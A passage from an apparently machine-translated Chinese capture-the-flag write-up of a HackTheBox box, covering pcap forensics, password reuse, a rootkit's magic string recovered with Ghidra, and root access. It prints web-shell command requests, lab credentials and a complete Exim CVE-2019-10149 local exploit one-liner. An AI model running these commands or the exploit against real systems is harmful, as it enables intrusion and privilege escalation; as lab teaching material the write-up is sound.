kp kq mq ks kt ku mr kw kx ky im bi">_________________________________________________________________</p><p id="c3a3" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">此帐户似乎是另一个FTP帐户。我们可以直接登录FTP服务。一旦我们成功登录，我们可以看到<code class="fe kz la lb lc b">incidents</code>文件夹，有一些有趣的<code class="fe kz la lb lc b">access.log</code>和<code class="fe kz la lb lc b">pcap</code>文件以及一个<code class="fe kz la lb lc b">notes.txt</code>。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/afb00c01a502090352bc63e466afcf54.png" data-original-src="https://miro.medium.com/v2/resize:fit:1112/format:webp/1*HMC3Mw-_T0umvzaYMUw6RA.png"/></div></figure><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi pg"><img src="../Images/025f2f079220c75d0cf62e74e02cba91.png" data-original-src="https://miro.medium.com/v2/resize:fit:1300/format:webp/1*uuKa9zdidplHxGOlAd-WJQ.png"/></div></figure><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="eec7" class="ms lq it lc b gy ni nj l nk nl"><strong class="lc iu">$ cat notes.txt </strong></span><span id="bbcd" class="ms lq it lc b gy ok nj l nk nl">After checking the logs and the network capture, all points to that the attacker knows valid credentials and abused a recently discovered vuln to gain access to the server!</span></pre><p id="dce6" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在阅读了<code class="fe kz la lb lc b">notes.txt</code>之后，我们的下一个任务似乎是我们需要分析<code class="fe kz la lb lc b">access.log</code>和<code class="fe kz la lb lc b">pcap</code>文件来发现一些凭证并进一步利用这个盒子。</p><p id="87fb" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当我们分析<code class="fe kz la lb lc b">ib01c01_incident.pcap</code>文件时，我们可以很快意识到这是pwnhats.htb网页的连接和认证日志。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ph"><img src="../Images/13b84c62d083bbb187e8b7a831bd3a40.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eUiw0wSdNGIQg2FnMVke7Q.png"/></div></div></figure><p id="9405" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">因为pwnhats.htb是用未加密的HTTP配置的，所以我们可以读取身份验证尝试并找到明文凭证以及管理页面URL。按照对pwnhats.htb管理门户的POST请求之一，我们可以成功地发现以下凭证。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pi"><img src="../Images/cf228f978ee1a3d454cecd0d26b52aec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7Uq1HJA7IdKa_eMYvybxaQ.png"/></div></div></figure><h2 id="c586" class="ms lq it bd lr mt mu dn lv mv mw dp lz km mx my md kq mz na mh ku nb nc ml nd bi translated">售前攻击尝试</h2><p id="a4fe" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi translated">根据<code class="fe kz la lb lc b">pcap</code>文件，当我们进入pwnhats.htb上的<code class="fe kz la lb lc b">/admin530o6uisg</code>页面时，我们可以看到<code class="fe kz la lb lc b">PrestaShop 1.7.4.4</code>登录页面。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi pj"><img src="../Images/21cba32172dd1d27c5d3d201b3706404.png" data-original-src="https://miro.medium.com/v2/resize:fit:1286/format:webp/1*v9qaqEN_UHVU2rJ4X6E0ZQ.png"/></div></figure><p id="5c9e" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">不允许使用这些<code class="fe kz la lb lc b">pwnhats@pwnhats.htb : GetYouAH4t!</code>凭证登录或继续超时。此外，<code class="fe kz la lb lc b">PrestaShop</code>的版本很容易受到公开的RCE <a class="ae oc" href="https://www.exploit-db.com/exploits/45964" rel="noopener ugc nofollow" target="_blank">攻击</a>——CVE-2018–19126，但是PoC脚本似乎不起作用。</p></div><div class="ab cl ld le hx lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="im in io ip iq"><h1 id="ebf7" class="lp lq it bd lr ls od lu lv lw oe ly lz ma of mc md me og mg mh mi oh mk ml mm bi translated">用户访问# 3—ib01c 01(*密码重用)</h1><p id="8351" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi">_________________________________________________________________</p><p id="438c" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">为<code class="fe kz la lb lc b">PrestaShop</code>管理门户找到的密码实际上被<code class="fe kz la lb lc b">ib01c01</code>帐户重复使用。有了它，我们就可以登录FTP服务了。在中，我们可以读取<code class="fe kz la lb lc b">user.txt</code>文件来成功收集用户标志。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi pk"><img src="../Images/68f6b74617acd988a9db2090647593a0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1338/format:webp/1*qJho1h-GP2mRzqQ7xIvz8A.png"/></div></figure><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi pl"><img src="../Images/4a3ed50e446bd6e01b4c6cb18c7a92f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1104/format:webp/1*g32HJCtjarIs1hQZ4pK2vg.png"/></div></figure></div><div class="ab cl ld le hx lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="im in io ip iq"><h1 id="4a38" class="lp lq it bd lr ls od lu lv lw oe ly lz ma of mc md me og mg mh mi oh mk ml mm bi translated">权限提升#1 — Rootkit</h1><p id="6775" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi">_________________________________________________________________</p><h2 id="4156" class="ms lq it bd lr mt mu dn lv mv mw dp lz km mx my md kq mz na mh ku nb nc ml nd bi translated">PCAP分析</h2><p id="0762" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi translated">从之前发现的<code class="fe kz la lb lc b">notes.txt</code>中得到提示，我们可以继续分析<code class="fe kz la lb lc b">ib01c01_incident.pcap</code>文件，看看攻击者做了什么。</p><p id="ba2f" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在TCP流20中，攻击者被允许通过使用有效凭证来访问<code class="fe kz la lb lc b">PrestaShop</code>应用的管理页面。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pm"><img src="../Images/c5493013f39bf6b341a1c986b61a1f70.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rsabv60CaaV3_qQ3wdoW0A.png"/></div></div><figcaption class="pn po gj gh gi pp pq bd b be z dk translated">TCP流20</figcaption></figure><p id="c61f" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在TCP流21中，我们可以看到“200 OK”被授予。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pr"><img src="../Images/78bab30c586f2195a27518590cde64dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5UjF1py6Ns8tWPMBxLjHHw.png"/></div></div><figcaption class="pn po gj gh gi pp pq bd b be z dk translated">TCP流21</figcaption></figure><p id="1b81" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在TCP流25中，我们可以看到另一个POST请求，它带有base64编码的反向shell有效负载。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ps"><img src="../Images/d0ccc29c093e2016ce0f96f9316880fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KgRfUGD7D3CmZkA9aImabA.png"/></div></div><figcaption class="pn po gj gh gi pp pq bd b be z dk translated">TCP流25</figcaption></figure><p id="89be" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当我们解码上面突出显示的字符串时，我们可以清楚地看到<code class="fe kz la lb lc b">netcat</code>reverse shell有效负载。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pt"><img src="../Images/e092159b50d969e5efd148514c76d23a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kwoQFYquwcEo-Ioc9Z_Oqw.png"/></div></div></figure><p id="493e" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在TCP流26中，我们可以看到攻击者能够获得机器上的RCE和<code class="fe kz la lb lc b">wget</code><code class="fe kz la lb lc b">Makefile</code>和<code class="fe kz la lb lc b">root.c</code>文件。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pu"><img src="../Images/e83f1be367758e278c9b07798415082f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*za_QULfbBdFb7SdeXLV9pg.png"/></div></div><figcaption class="pn po gj gh gi pp pq bd b be z dk translated">TCP流26</figcaption></figure><p id="19af" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在TCP流27中，我们可以看到<code class="fe kz la lb lc b">Makefile</code>的内容。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pv"><img src="../Images/847b4aef48e2cf63879259c714981c83.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zrk3_AuT3ZuLPiZQ55l9YQ.png"/></div></div><figcaption class="pn po gj gh gi pp pq bd b be z dk translated">TCP流27</figcaption></figure><p id="a102" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在TCP流28中，我们还可以看到<code class="fe kz la lb lc b">root.c</code>文件的源代码。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pw"><img src="../Images/7fa3747c6ed99fcf40b61a2ee3fe6d61.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d3qShgEpuEmOgydFvf0czw.png"/></div></div><figcaption class="pn po gj gh gi pp pq bd b be z dk translated">TCP流28</figcaption></figure><p id="39eb" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在源代码中还发现了一个硬编码的神奇值。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi px"><img src="../Images/dde6d9003e80a4d5f1a09a13af87fc21.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_kaF92bQtRco3T2Y3E0JUA.png"/></div></div></figure><p id="46b5" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">最后，TCP流29是最后一个，它是不可读的文件。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi py"><img src="../Images/9f1116ff639d6ce8a7e9618e585169c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vvH6J2-To7BK5Qjh2ir0dg.png"/></div></div><figcaption class="pn po gj gh gi pp pq bd b be z dk translated">TCP流29</figcaption></figure><p id="d2a5" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">因此，从<code class="fe kz la lb lc b">pcap</code>文件中找到的信息，我们可以很容易地使用可加载内核模块(LKM)谷歌并找到关于这个rootkit的资源。更多详细信息请点击查看<a class="ae oc" href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485" rel="noopener ugc nofollow" target="_blank">。但简而言之:</a></p><blockquote class="pz qa qb"><p id="df9e" class="kb kc nw kd b ke kf kg kh ki kj kk kl qc kn ko kp qd kr ks kt qe kv kw kx ky im bi translated">当一个进程向我们的特殊设备写入一个神奇的字符串时，我们的LKM会给这个进程一个根凭证。您可以用许多不同的方式改变这种方法。例如，另一种经典的方法是编写您想要授予权限的进程的<code class="fe kz la lb lc b"><em class="it">PID</em></code>。</p></blockquote><p id="b86c" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">资源页面中的PoC代码似乎与<code class="fe kz la lb lc b">root.c</code>文件完全相同。我们可以看到同样的神奇价值。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qf"><img src="../Images/c0901e1f74a7b920b00b7fd29397e7ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*f19aLDGMkaQHOo7TJRIEUg.png"/></div></div></figure><h2 id="b390" class="ms lq it bd lr mt mu dn lv mv mw dp lz km mx my md kq mz na mh ku nb nc ml nd bi translated">root.ko</h2><p id="f85a" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi translated">此外，在<code class="fe kz la lb lc b">ib01c01</code>用户FTP访问中，有一个隐藏的文件夹<code class="fe kz la lb lc b">...</code>，在那里可以找到<code class="fe kz la lb lc b">root.ko</code>文件。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi qg"><img src="../Images/26afc63e64a600d9a1bc28f2e18d09f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1350/format:webp/1*Gwg2-XTwTyfRuSnJvGDwdw.png"/></div></figure><p id="4aca" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">根据PoC页面，当通过<code class="fe kz la lb lc b">Makefile</code>编译<code class="fe kz la lb lc b">root.c</code>时，它将创建<code class="fe kz la lb lc b">rook.ko</code>文件。当它通过以下指令加载时:</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qh"><img src="../Images/acb6c8c6fac653292f22d9367bcd1639.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T3IFQFYIhtC6-uKKhPJJOw.png"/></div></div></figure><p id="f5ff" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">然后，它会在<code class="fe kz la lb lc b">/dev</code>文件夹下创建一个名为<code class="fe kz la lb lc b">/dev/ttyR0</code>的新设备。创建后，必须使用以下命令修改其权限:</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qi"><img src="../Images/c18ea5fdf3f3dbd13bc2c99ad076b9d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GdQiusdsi7R_TIeGt3eFkA.png"/></div></div></figure><p id="8deb" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">配置完成后，我们可以通过向设备提供一个神奇的值，在root用户的上下文中运行一个命令。资源页面中的概念验证如下:</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qj"><img src="../Images/57f54f252d0621972969382087b94b5b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4zI2IBBqSmyHCNsb0DkAHA.png"/></div></div></figure><p id="2710" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">知道了这一切，我们首先可以检查的是攻击者是否已经在盒子上安装了rootkit，特别是在盒子中发现了<code class="fe kz la lb lc b">root.ko</code>文件。为此，我们可以简单地查询<code class="fe kz la lb lc b">/dev/ttyR0</code>。(<em class="nw">*对于我自己，我使用PoC页面在我的本地机器上创建了这个rootkit，以了解它是如何编译、安装、执行等等的更多信息。我强烈推荐这么做:] </em>)</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="3153" class="ms lq it lc b gy ni nj l nk nl">GET /shell.php?hidden=ls+-la+/dev/+|+grep+ttyR   <strong class="lc iu">      # URL-encoded</strong></span></pre><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qk"><img src="../Images/782e41f61142d8fbb8544cac30670ad7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_q9FBsWNC4JBZEbz7s_trA.png"/></div></div></figure><p id="c5ca" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">厉害了，我们可以看到<code class="fe kz la lb lc b">/dev/ttyR0</code>已经在盒子里创建好了，还配置了<code class="fe kz la lb lc b">0666</code>权限。现在，让我们尝试使用找到的神奇单词“g0tR0ot”执行一个命令，看看我们是否可以在root的上下文中执行它。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="bbf2" class="ms lq it lc b gy ni nj l nk nl">GET /shell.php?hidden=echo+"g0tR0ot"+&gt;+/dev/ttyR0+%26%26+id</span></pre><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ql"><img src="../Images/a1e6a29c4b0549aac1610760b0e34156.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Mk2uX4vHIMMGacOp9XSUmA.png"/></div></div></figure><h2 id="30cc" class="ms lq it bd lr mt mu dn lv mv mw dp lz km mx my md kq mz na mh ku nb nc ml nd bi translated">反编译root.ko(使用的工具:Ghidra)</h2><p id="dc1a" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi translated">嗯……没用。这个神奇的词可能不是“g0tR0ot”让我们下载<code class="fe kz la lb lc b">root.ko</code>文件，通过反编译对它做进一步的分析。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oj"><img src="../Images/0102fc3e951db5b0e4e9ca0d3ce869e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mVr9HaO5lUH4xQi0pgaV4A.png"/></div></div></figure><p id="b482" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们可以使用名为<a class="ae oc" href="https://ghidra-sre.org/" rel="noopener ugc nofollow" target="_blank"> <em class="nw"> Ghidra </em> </a>的反编译器来完成我们的目标。创建一个新项目并导入我们的<code class="fe kz la lb lc b">root.ko</code>文件。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qm"><img src="../Images/4bfcc152f4931f83da1848654bd09daf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EwCk2AqGLoNt3NCgVNz1jQ.png"/></div></div></figure><p id="5359" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">然后，双击文件名开始反编译。我只是用默认设置来分析文件。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qn"><img src="../Images/d103394f4d7831c8e2835887788c8be2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JTK8ai-gRHma5QywzB7kCg.png"/></div></div></figure><p id="cdd5" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">然后，我们想看看<code class="fe kz la lb lc b">root_write()</code>函数，看看“magic”值发生了什么变化。我们可以看到Ghidra成功反编译了文件；然而，我们可以注意到变量被转换成了局部指针。为了便于查看，我使用IDA Pro反汇编程序查找变量名，将这些指针转换为变量名。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qo"><img src="../Images/36b75cf513396b5e0004067c7fb4c26d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YPHrvAjhD95w4RIoh7-lcw.png"/></div></div><figcaption class="pn po gj gh gi pp pq bd b be z dk translated">Ghidra —反编译root.ko</figcaption></figure><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qp"><img src="../Images/2cf8fa45f0abf6680f8f3086d5679b5b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xehkHwpj1to5U9DHBRwyJg.png"/></div></div><figcaption class="pn po gj gh gi pp pq bd b be z dk translated">IDA Pro —查找变量名</figcaption></figure><p id="a67e" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">现在，在<em class="nw"> Ghidra </em>中将这些指针值重命名为变量名。一旦我做到了这一点，我还将以下变量的十六进制值转换为ASCII码:</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="c361" class="ms lq it lc b gy ni nj l nk nl">* a = 0x743367 (ASCII -&gt; "t3g")                   <strong class="lc iu"># g3t</strong><br/>* b = 0x76317250 (ASCII -&gt; "v1rP")                <strong class="lc iu"># Pr1v</strong><br/>* magic = 0x746f3052743067 (ASCII -&gt; "to0Rt0g")   <strong class="lc iu"># g0tR0ot</strong> </span><span id="ef69" class="ms lq it lc b gy ok nj l nk nl"><em class="nw">(*Note: HEX values are Little Endian)</em></span></pre><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qq"><img src="../Images/0d61b89c2d6730f5e36ce3189980463c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*THlPjIxLKkQJLMpyyLKfhw.png"/></div></div></figure><p id="a77d" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">同样，我们可以看到<code class="fe kz la lb lc b">snprinf()</code>函数正在用<code class="fe kz la lb lc b">a</code> + <code class="fe kz la lb lc b">b</code>覆盖<code class="fe kz la lb lc b">magic</code>值，也就是“g3tPr1v”我们可以确认这是否是触发rootkit的新的<code class="fe kz la lb lc b">magic</code>字符串。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="5c4e" class="ms lq it lc b gy ni nj l nk nl">GET /shell.php?hidden=echo+"g3tPr1v"+&gt;+/dev/ttyR0+%26%26+id+%26+ifconfig</span></pre><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qr"><img src="../Images/af2a46b5b0c300a45cc8914d9e0455db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6Midn5njIKgOdOkDmI1d4w.png"/></div></div></figure><p id="df04" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">完美！这是正确的<code class="fe kz la lb lc b">magic</code>字符串，现在我们可以作为根用户执行命令。我们可以读取<code class="fe kz la lb lc b">root.txt</code>文件来完成这个盒子。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qs"><img src="../Images/7174369da5a4435dfd545e89f91000d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qIyus2yFONWjJB8dhLTAwA.png"/></div></div></figure></div><div class="ab cl ld le hx lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="im in io ip iq"><h1 id="76d1" class="lp lq it bd lr ls od lu lv lw oe ly lz ma of mc md me og mg mh mi oh mk ml mm bi translated">权限提升#2 —进出口SMTP</h1><p id="2def" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi">_________________________________________________________________</p><p id="f28f" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">因此，第二个权限提升部分是通过安装在机器中的Exim SMTP服务器。这是一种意想不到的方式，漏洞概念验证比盒子发布晚了一点。详细的Exim 4.9.1远程命令执行漏洞(CVE-2019–10149)可以在<a class="ae oc" href="https://packetstormsecurity.com/files/153218/Exim-4.9.1-Remote-Command-Execution.html" rel="noopener ugc nofollow" target="_blank">这里</a>找到。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi qt"><img src="../Images/51b0aa78efbf826957973aee5cb426d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1214/format:webp/1*uBANw-QGlK2TPSRplRw2jg.png"/></div><figcaption class="pn po gj gh gi pp pq bd b be z dk translated">利用概念验证</figcaption></figure><p id="da80" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">这种利用是可能的，因为:</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi qu"><img src="../Images/5c08605ca107dcca8452edb92dffedaf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1128/format:webp/1*neyf0cU2CjS77aZ0OLIUFw.png"/></div></figure><p id="cd0b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">这个漏洞看起来非常简单，安装在清道夫盒子中的Exim SMTP服务器版本很容易受到攻击。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi qv"><img src="../Images/bf4c8c362a68e515e9c24b331a8e0a1b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1252/format:webp/1*d7pVdBoODSGYDHQVlN0Kiw.png"/></div></figure><p id="3add" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我检查了远程攻击是不可能的；然而，本地利用这一点是可能的，这意味着我们可以在从<code class="fe kz la lb lc b">shell.php</code>获得RCE后利用这一攻击获得根用户访问权。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="9ecc" class="ms lq it lc b gy ni nj l nk nl"><strong class="lc iu">### Exim SMTP Exploit PoC Code</strong><br/>touch /dev/shm/bigb0ss;(sleep 1 ; echo HELO bigb0ss ; sleep 1 ; echo 'MAIL FROM:&lt;&gt;' ; sleep 1 ; echo 'RCPT TO:&lt;${run{\x2Fbin\x2Fsh\x09-c\x09\x22cat\x09\x2Froot\x2Froot.txt\x3E\x3E\x2Fdev\x2Fshm\x2Fbigb0ss\x22}}<a class="ae oc" href="http://twitter.com/localhost" rel="noopener ugc nofollow" target="_blank">@localhost</a>&gt;' ; sleep 1 ; echo DATA ; sleep 1 ; echo "Received: 1" ; echo "Received: 2" ; echo "Received: 3" ; echo "Received: 4" ; echo "Received: 5" ; echo "Received: 6" ; echo "Received: 7" ; echo "Received: 8" ; echo "Received: 9" ; echo "Received: 10" ; echo "Received: 11" ; echo "Received: 12" ; echo "Received: 13" ; echo "Received: 14" ; echo "Received: 15" ; echo "Received: 16" ; echo "Received: 17" ; echo "Received: 18" ; echo "Received: 19" ; echo "Received: 20" ; echo "Received: 21" ; echo "Received: 22" ; echo "Received: 23" ; echo "Received: 24" ; echo "Received: 25" ; echo "Received: 26" ; echo "Received: 27" ; echo "Received: 28" ; echo "Received: 29" ; echo "Received: 30" ; echo "Received: 31" ; echo "" ; echo "." ; echo QUIT) | nc 127.0.0.1 25</span><span id="e081" class="ms lq it lc b gy ok nj l nk nl"><em class="nw">(*Disclaimer: During this exploit, I was having many syntax errors, and CurioCT was a hero to help me to fix it. Thanks mate!)</em></span></pre><p id="fd1b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">因此，一旦被利用，它会将<code class="fe kz la lb lc b">root.txt</code>文件转换为<code class="fe kz la lb lc b">/dev/shm/bigb0ss</code>文件。由于<code class="fe kz la lb lc b">bigb0ss</code>文件将在当前用户的上下文中创建，我们可以直接读取该文件:)</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div 